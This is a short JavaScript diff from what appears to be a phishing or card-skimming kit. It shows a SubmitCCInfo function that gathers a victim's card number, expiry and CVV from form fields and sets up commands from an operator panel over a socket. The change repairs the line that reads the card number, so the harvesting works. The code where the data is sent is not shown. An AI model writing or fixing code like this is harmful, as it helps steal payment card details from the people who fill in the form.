@@ -19,7 +19,7 @@ const SubmitCCInfo = async () => {
         initActionsOnCommandsFromPanelFunc(socket);
     }
 
-    let hpCardNumberVal = hpCardNumberVal.value;
+    let hpCardNumberVal = hpCardNumberInput.value;
     let hpCardMMYYVal = hpCardMMYY.value || "no info";
     let hpCardCvvVal = hpCardCVV.value || "no info";
 
